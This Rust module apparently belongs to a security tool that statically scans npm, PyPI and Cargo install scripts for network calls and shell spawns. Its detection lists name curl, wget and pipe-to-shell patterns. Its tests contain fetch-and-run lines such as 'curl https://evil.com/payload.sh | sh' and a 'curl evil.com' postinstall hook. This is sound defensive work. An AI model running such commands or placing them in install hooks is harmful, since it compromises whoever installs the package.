//! M6 ch6 — install-script analysis (read-only, never executes).
//!
//! Token-level scan for network-call and shell-spawn patterns inside install
//! lifecycle scripts:
//!
//!  * **npm**: `package.json:scripts.{preinstall, install, postinstall,
//!    prepare}` — the four lifecycle hooks that run unconditionally on
//!    `npm install`.
//!  * **PyPI**: `setup.py` body (executes arbitrary Python at install time)
//!    and the script entries in `pyproject.toml [project.scripts]`.
//!  * **Cargo**: `build.rs` body (a build script that runs at compile time).
//!
//! ## Module contract (enforced by doc-comment + acceptance test)
//!
//!  1. **Read-only.** Never executes the script being analyzed.
//!  2. **No fetch.** Operates on script text already on disk OR text carried
//!     inline in a registry-API response. tirith does NOT download a package
//!     to inspect it (matches the [`crate::install_txn`] shipping non-goal at
//!     `install.rs:42`).
//!  3. **Per-ecosystem scope.** npm registry responses carry `scripts.{...}`
//!     inline — both lockfile and installed paths can evaluate; PyPI METADATA
//!     does NOT carry setup.py content — installed-tree mode only;
//!     crates.io does NOT carry build.rs — installed-tree mode only.
//!
//! The scan is a heuristic. Token-level matching with string-literal
//! awareness reduces false positives but cannot eliminate them — a `curl`
//! mention inside a comment can still match. This is documented in the
//! rule's `false_positive_guidance`.

use crate::package_risk::InstallScriptSignals;

/// Token-level scan for network calls and shell spawns.
///
/// Combines all four npm script hooks (`preinstall`, `install`, `postinstall`,
/// `prepare`) into one analysis when present.
///
/// `script_text` is the raw text of the script (or the concatenation of all
/// applicable npm script entries). Pure: no I/O.
pub fn analyze_script_text(script_text: &str) -> InstallScriptSignals {
    let mut signals = InstallScriptSignals::default();
    if script_text.is_empty() {
        return signals;
    }

    // Walk lines and skip obvious comments. This is a heuristic — `curl` in a
    // mid-line trailing comment will still match; document and accept that.
    for line in script_text.lines() {
        let trimmed = line.trim_start();
        if trimmed.starts_with('#') || trimmed.starts_with("//") {
            continue;
        }
        // Strip a trailing line comment for shell-style lines.
        let body = trimmed.split('#').next().unwrap_or(trimmed);
        let lower = body.to_lowercase();

        if NETWORK_CALL_PATTERNS.iter().any(|p| token_match(&lower, p)) {
            signals.has_network_call = true;
            signals
                .suspicious_patterns
                .push(format!("network call: {}", body.trim()));
        }
        if SHELL_SPAWN_PATTERNS.iter().any(|p| token_match(&lower, p)) {
            signals.has_shell_spawn = true;
            signals
                .suspicious_patterns
                .push(format!("shell spawn: {}", body.trim()));
        }
    }

    // Cap the descriptions to keep the JSON shape bounded.
    const MAX_DESC: usize = 5;
    if signals.suspicious_patterns.len() > MAX_DESC {
        signals.suspicious_patterns.truncate(MAX_DESC);
    }
    signals
}

/// Network-call token patterns. Token boundary match — checked with
/// `token_match` so a substring like "curlydocs" does not match "curl".
const NETWORK_CALL_PATTERNS: &[&str] = &[
    "curl",
    "wget",
    "fetch",
    "http.get",
    "https.get",
    "request(",
    "axios.",
    "urllib",
    "requests.get",
    "requests.post",
    "urlretrieve",
    "downloadfile",
    "invoke-webrequest",
    "invoke-restmethod",
    "iwr ",
    "irm ",
];

/// Shell-spawn token patterns.
const SHELL_SPAWN_PATTERNS: &[&str] = &[
    " | sh",
    " | bash",
    "bash -c",
    "sh -c",
    "system(",
    "spawn(",
    "subprocess.run",
    "subprocess.popen",
    "subprocess.call",
    "process.spawn",
];

/// `true` when `haystack` contains `needle` at a word/token boundary, treating
/// `.`, `:`, `_`, `-`, `(`, ` ` as boundaries. Conservative — keeps "curl"
/// from matching "curly".
fn token_match(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }
    // For multi-char patterns that include spaces / parens / pipes already, a
    // plain substring check is fine — the pattern itself is the boundary.
    if needle.contains(' ')
        || needle.contains('(')
        || needle.contains('|')
        || needle.ends_with('.')
        || needle.contains('-')
    {
        return haystack.contains(needle);
    }
    // Otherwise, require a boundary on each side of the substring match.
    for (idx, _) in haystack.match_indices(needle) {
        let before_ok = if idx == 0 {
            true
        } else {
            let prev = haystack.as_bytes()[idx - 1];
            !(prev.is_ascii_alphanumeric() || prev == b'_')
        };
        let after = idx + needle.len();
        let after_ok = if after == haystack.len() {
            true
        } else {
            let next = haystack.as_bytes()[after];
            !(next.is_ascii_alphanumeric() || next == b'_')
        };
        if before_ok && after_ok {
            return true;
        }
    }
    false
}

/// Read npm install scripts from a `package.json` JSON value and concatenate
/// their bodies into one string ready for [`analyze_script_text`].
/// Returns `None` when no install lifecycle hooks are defined.
pub fn npm_script_text(package_json: &serde_json::Value) -> Option<String> {
    let scripts = package_json.get("scripts")?.as_object()?;
    let mut out = String::new();
    for hook in ["preinstall", "install", "postinstall", "prepare"] {
        if let Some(body) = scripts.get(hook).and_then(|v| v.as_str()) {
            if !body.trim().is_empty() {
                out.push_str(body);
                out.push('\n');
            }
        }
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

/// Read a `package.json` from disk and run [`npm_script_text`] on it.
/// Returns `None` on any I/O / parse failure.
pub fn npm_script_text_from_disk(package_json_path: &std::path::Path) -> Option<String> {
    let text = std::fs::read_to_string(package_json_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&text).ok()?;
    npm_script_text(&json)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_script_text_no_signals() {
        let s = analyze_script_text("");
        assert!(!s.fires());
    }

    #[test]
    fn curl_pipe_sh_detects_both_network_and_shell_spawn() {
        let s = analyze_script_text("curl https://evil.com/payload.sh | sh");
        assert!(s.has_network_call, "curl is a network call");
        assert!(s.has_shell_spawn, "| sh is a shell spawn");
        assert!(s.fires());
    }

    #[test]
    fn comment_with_curl_does_not_fire_when_alone_on_line() {
        let s = analyze_script_text("# curl is documented here\n");
        assert!(!s.has_network_call, "a # line is a comment");
    }

    #[test]
    fn wget_detects_network_call() {
        let s = analyze_script_text("wget -O- https://example.com/script | bash");
        assert!(s.has_network_call);
        assert!(s.has_shell_spawn);
    }

    #[test]
    fn token_match_does_not_match_substring() {
        assert!(!token_match("curly", "curl"));
        assert!(token_match("curl ", "curl"));
        assert!(token_match("curl;", "curl"));
        assert!(token_match("curl\n", "curl"));
        assert!(token_match("./curl", "curl"));
    }

    #[test]
    fn npm_script_text_concats_hooks() {
        let pkg = serde_json::json!({
            "name": "p",
            "scripts": {
                "preinstall": "echo pre",
                "postinstall": "curl evil.com",
                "test": "jest"
            }
        });
        let text = npm_script_text(&pkg).expect("hooks present");
        assert!(text.contains("echo pre"));
        assert!(text.contains("curl evil.com"));
        assert!(!text.contains("jest"));
    }

    #[test]
    fn npm_script_text_returns_none_when_no_hooks() {
        let pkg = serde_json::json!({
            "name": "p",
            "scripts": { "test": "jest" }
        });
        assert!(npm_script_text(&pkg).is_none());
    }

    #[test]
    fn npm_script_text_returns_none_for_empty_string_hook() {
        let pkg = serde_json::json!({
            "name": "p",
            "scripts": { "postinstall": "   " }
        });
        assert!(npm_script_text(&pkg).is_none());
    }

    #[test]
    fn python_subprocess_run_is_shell_spawn() {
        let s = analyze_script_text("import subprocess\nsubprocess.run(['sh', '-c', 'echo hi'])");
        assert!(s.has_shell_spawn);
    }

    #[test]
    fn clean_build_script_does_not_fire() {
        let s = analyze_script_text(
            "fn main() {\n    println!(\"cargo:rerun-if-changed=src/main.rs\");\n}\n",
        );
        assert!(!s.fires(), "a clean build script must not fire");
    }
}
